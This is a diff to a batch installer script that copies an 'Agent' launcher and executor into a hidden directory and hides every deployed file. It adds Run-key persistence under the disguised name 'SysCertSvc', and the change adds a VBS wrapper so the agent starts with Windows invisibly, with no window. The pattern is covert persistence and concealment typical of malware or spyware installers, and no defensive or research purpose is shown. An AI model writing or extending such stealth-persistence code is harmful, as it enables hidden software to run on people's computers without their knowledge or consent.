@@ -10,7 +10,7 @@ setlocal enabledelayedexpansion
 :: 1. Verifies that all required components are present.
 :: 2. Installs the Launcher and Executor in the user's secret directory.
 :: 3. Copies the registry backup to the same location.
-:: 4. Configures registry persistence to start with Windows.
+:: 4. Configures registry persistence to start with Windows (background).
 :: 5. Hides all files and folders with system attributes.
 :: =================================================================================
 
@@ -75,7 +75,7 @@ echo   Todos os componentes estao prontos para a instalacao.
 echo   A seguinte acao sera executada:
 echo.
 echo   - Os arquivos serao copiados para: %secretPath%
-echo   - O Agente sera configurado para iniciar com o Windows.
+echo   - O Agente sera configurado para iniciar com o Windows em background (sem janela).
 echo   - Todos os arquivos implantados serao ocultados.
 echo   ------------------------------------------------------------
 echo.
@@ -96,14 +96,21 @@ echo [ACAO]   Copiando arquivos do Agente...
 copy /Y "%~dp0\%launcherFile%" "%secretPath%\" >nul
 copy /Y "%~dp0\%workerFile%" "%secretPath%\" >nul
 copy /Y "%~dp0\%regFile%" "%secretPath%\" >nul
-echo [SUCESSO] Arquivos copiados.
+
+echo [ACAO]   Criando o script VBS para executar em background...
+(
+    echo Set WshShell = CreateObject("WScript.Shell"^)
+    echo WshShell.Run """" ^& WScript.Arguments(0) ^& """" , 0, False
+) > "%secretPath%\launcher_invisible.vbs"
+
+echo [SUCESSO] Arquivos copiados e script VBS criado.
 echo.
-echo [ACAO]   Configurando persistencia no registro...
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysCertSvc" /t REG_SZ /d "cmd /c start \"\" /B \"%secretPath%\\%launcherFile%\"" /f >nul
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysCertSvc" /t REG_SZ /d "cmd /c start \"\" /B \"%secretPath%\\%launcherFile%\"" /f >nul
+echo [ACAO]   Configurando persistencia no registro para executar em segundo plano...
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysCertSvc" /t REG_SZ /d "wscript.exe \"%secretPath%\\launcher_invisible.vbs\" \"%secretPath%\\%launcherFile%\"" /f >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysCertSvc" /t REG_SZ /d "wscript.exe \"%secretPath%\\launcher_invisible.vbs\" \"%secretPath%\\%launcherFile%\"" /f >nul
 
 if %errorlevel% equ 0 (
-    echo [SUCESSO] Persistencia configurada.
+    echo [SUCESSO] Persistencia configurada para executar em background.
 ) else (
     echo [ERRO]   Falha ao configurar a persistencia.
 )
